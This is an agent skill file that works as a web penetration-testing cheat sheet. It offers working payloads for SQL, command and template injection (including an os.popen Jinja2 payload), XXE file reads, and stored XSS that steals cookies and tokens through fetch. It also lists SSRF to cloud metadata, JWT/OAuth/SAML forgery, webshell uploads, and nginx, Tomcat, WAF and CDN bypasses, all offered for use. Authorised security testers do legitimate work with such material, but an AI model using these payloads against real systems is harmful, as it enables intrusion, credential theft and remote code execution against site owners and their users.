---
name: web-attack-methods
description: >-
  Full-stack Web attacks: SQLi / command injection / SSTI / XSS / SSRF / NoSQL, authentication JWT / OAuth / SAML, LFI / upload, bypasses for Tomcat / WS / STOMP / XFF / PATH_INFO / CDN 502 / Wangsu JS challenge. Use when testing Web injection, auth bypass, server-side issues, or WAF/CDN bypass.
metadata:
  tags: [penetration-testing, penetration-testing, red-team]
---

## Web Attack Methods (injection / authentication / server-side / misc / CDN)

```
=== Web injection ===
SQLi: sqlmap -u URL --technique=BEUSTQ --risk=3 --level=5 --os-shell | manual tests ' OR 1=1-- / ' AND SLEEP(5)--
  Bypasses: SEL/**/ECT, case changes, CHAR() | escalation: OUTFILE → webshell / xp_cmdshell / UDF
Command injection: ; | && $(cmd) `cmd` %0a | bypass spaces with $IFS, bypass cat with tac/nl | OOB ;nslookup $(whoami).OOB
SSTI: {{7*7}} Jinja2 / ${7*7} FreeMarker / #{7*7} Ruby | Jinja2 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
XSS: HTML / attribute / JS / href / DOM / SVG | bypass CSP with JSONP / AngularJS CDN | XXE: <!ENTITY xxe SYSTEM "file:///etc/passwd"> / "http://OOB/"
🚨 Stored XSS via WebSocket/STOMP chat: agent panels of customer-service systems (OCS / LiveChat) often render visitor messages with innerHTML / v-html (Vue domProps innerHTML)
  Attack chain: visitor connects via STOMP → sends a message containing <img src=x onerror=fetch(...)> → agent opens the conversation → XSS runs in the agent's browser → steal cookie / token / localStorage
  Key point: the agent's browser usually has outbound network access (not subject to backend air-gap restrictions)! Payload targets: document.cookie + localStorage + fetch(admin API).then(exfil)
  Bypass: messages with mf:1 (visitor identity) and tp:0 (text type) content goes directly into innerHTML; image messages use the url field (<img src>) and do not go through innerHTML
SSRF: IP bypasses 2130706433 / [::1] / nip.io / #@ | cloud metadata 169.254.169.254 | Redis via gopher://127.0.0.1:6379/_
NoSQL: {"password":{"$ne":""}} / {"$regex":"^a"}

=== Authentication and authorization ===
Authentication bypass: admin'-- | password reset (predictable token / Host header injection) | MFA bypass (skip / brute-force 4-6 digits) | rotate IPs via X-Forwarded-For
IDOR: change resource IDs for horizontal privilege escalation | mass assignment {"role":"admin","isAdmin":true}
JWT: jwt_tool -X a (alg none / RS256→HS256) | -C to crack weak secrets | kid injection | jku/x5u remote keys
401/403 bypass: /admin/ /Admin /%2561dmin /admin;/ /admin..;/ | X-Original-URL / X-Rewrite-URL / X-Forwarded-For: 127.0.0.1
OAuth/OIDC: redirect_uri manipulation (appending / suffixes / @ confusion / path traversal) | missing state → CSRF | PKCE downgrade | wrapping id_token in a JWT for full JWT attacks
SAML: XSW signature wrapping (SAML Raider) | signature stripping | comment truncation admin<!---->@evil | Golden SAML (IdP private key)

=== Server-side ===
LFI: ../../../etc/passwd | php://filter to read source | data:// expect:// phar:// | RCE chains: log poisoning / session poisoning / phar deserialization
File upload: shell.php.jpg / .PHP / .php. / %00 | .htaccess to change parsing | GIF89a magic bytes | ImageMagick / Ghostscript
🚨 Spring Boot Actuator path traversal to bypass the authentication interceptor: the interceptor matches /api/* but the actuator is whitelisted → /actuator/../api/v1/endpoint bypasses the interceptor and reaches the protected endpoint
  Principle: Spring Security / custom interceptors match paths before normalization, while Tomcat routes after normalization → path traversal bypasses the interceptor but still reaches the target Servlet
  Verification: /actuator/health returns 200 (whitelisted) → /actuator/../target also returns 200 (bypassed) vs direct /target returns 403 / "sign is empty" (blocked) | /actuator/health/../../target (template path {*path} traversal)
  Weakness in sign validation: many custom sign checks only verify that the header is non-empty (sign: any value + expTime: any number passes) → seeing code:500 instead of "sign is empty" = validation passed | quick check: sign:0 or sign:aaa changing from "sign is empty" to 500 = only checks non-emptiness
  Escalation: after bypass, combine with X-HTTP-Method-Override: POST so a GET request triggers the POST handler (supported by some Spring configurations)

=== Web misc ===
🚨 Tomcat ..;/ bypass of nginx path restrictions: nginx does not parse ; in URLs (treats it as part of the path), but Tomcat treats ..;/ as path traversal:
  /api/v1/v/..;/admin/path → nginx matches /api/v1/v/ (allowed) → Tomcat resolves it to /admin/path (traversal!)
  Verification: a plain /admin returns nginx 403; /api/v1/v/..;/admin returns Tomcat 404 = bypass successful
  Limitation: Spring MVC DispatcherServlet routing is independent of the filesystem; only static files within the same war / non-MVC paths are accessible
  Combination: pair with a JSP webshell written via Spring4Shell, or access actuator endpoints
🚨 WebSocket/STOMP frames bypass nginx method restrictions: nginx returns 405 for POST /api/v1/a/login, but STOMP frames after a WebSocket upgrade are not restricted:
  1. GET /api/v1/v/ws/{3 digits}/{8 random chars}/websocket → 101 Upgrade (bypasses via the visitor path)
  2. STOMP CONNECT → STOMP SEND destination:/app/a/login → goes straight to the Spring backend
  SockJS XHR alternative: POST .../xhr_send to send STOMP frames (204 = success), no real WebSocket required
  Pitfall: the CDN disconnects quickly ("Another connection still open"); raw sockets are more reliable than WebSocket libraries
🚨 X-Forwarded-For bypass of application-layer IP blacklists: the CDN trusts the XFF header, and the application takes the client IP from XFF for blacklist checks:
  Effective: X-Forwarded-For: 1.1.1.1 | X-Forwarded-For: 127.0.0.1, 10.0.0.1
  Ineffective: X-Real-IP, X-Client-IP, CF-Connecting-IP, True-Client-IP, Forwarded
  Detection: the response contains {code:10010, msg:"blacklisted"} and the data field is your real IP
🚨 PATH_INFO nginx deny bypass: nginx denies .php files (returns a 146-byte nginx 404) but PHP-FPM is still reachable via PATH_INFO:
  /denied/file.php → 404|146 (blocked by nginx) | /denied/file.php/ → 16B "File not found." (PHP-FPM executes!)
  /denied/file.php/x → same as above. PHP-FPM returning "File not found." means the request got past the nginx deny to PHP-FPM (the script path is just wrong)
  Exploitation: if PHP has cgi.fix_pathinfo=1 (default), /uploads/shell.jpg/x.php → PHP executes shell.jpg! | after confirming, find the actual FPM docroot (which may differ from nginx's)
  Identification: nginx deny returns a fixed size (146B standard 404), PHP-FPM returns 16B "File not found." → a size difference is the breakthrough signal
🚨 Response-size fingerprinting (hidden file discovery): the CMS catch-all route returns a fixed-size homepage (e.g. 44004B); a real nginx 404 returns 146B
  File exists but is denied: returns 146B (nginx 404) | file does not exist: returns the catch-all size (44004B) → 146B = the file really exists!
  Method: batch-scan paths and classify by response size: catch-all = does not exist, nginx 404 = exists but forbidden, other sizes = accessible
WAF bypass decision tree: encoding → protocol level → path → mutation → IP spoofing → smuggling | CORS: Origin reflection + Credentials: true
🚨 CDN 502 bypass (URL-pattern filtering): when the CDN returns 502 for admin paths, HTTP encoding / smuggling / method changes are all ineffective → switch protocols:
  ① WebSocket upgrade: the CDN usually filters only HTTP responses; WS paths may not be in the filter rules. /api/v1/a/ws/ returns 200 while /api/v1/a/doLogin returns 502 = WS paths are not filtered
  ② Find the origin IP and connect directly: DNS history / certificate transparency / SNI scanning / same-subnet scanning / email header Return-Path / Shodan fingerprint matching / CDN origin configuration leaks / unique error-page fingerprints → bypass the CDN and connect to the backend directly
  ③ Non-standard ports: scan all ports on the CDN nodes; some ports may proxy different backends or have different filter rules (e.g. 8085 exposing actuator)
  ④ Path traversal: /api/v1/v/..;/a/doLogin lets Tomcat route to admin, but the CDN may not recognize it (note: the CDN may still filter responses)
  ⑤ Wildcard DNS identification: all subdomains resolving to the CDN = wildcard DNS, not real records. Compare results from 114.114.114.114 / 8.8.8.8
🚨 WSCN / Wangsu CDN JS challenge identification and bypass: a response containing `_jsc_ch_conf` + `ws_sec_page.js` = Wangsu JS challenge (not a WAF block)
  Signatures: cv:".domain", mt:"jhsq987", chType / chTs / chID / chHash fields | 403 page of 6000+ bytes containing "Embed Iframe"
  Bypass: the CDN does not challenge a specific path whitelist (e.g. /c/) → use Spring Boot ..;/ traversal (`/c/..;/target_path`) to reach other backend routes
  Identifying the backend framework: JSON error `{"timestamp":...,"status":...,"error":...,"path":...}` = Spring Boot | 405 = route exists but the method is wrong

=== CDN bypass (target behind a CDN, admin interface returns 502) ===
CDN 502 analysis: distinguish URL-pattern filtering (fixed timing ~0.3s, 502 for all methods / encodings / ports / nodes) vs response-content filtering vs backend down
  Key check: if path traversal (`/api/v1/v/..;/a/doLogin`) returns a Tomcat 404 = it passed through the CDN to the backend; a 502 = blocked by CDN URL-pattern rules
  nginx 502 vs CDN PWS 502: nginx = the edge reverse proxy is down; PWS = a global CDN policy
```
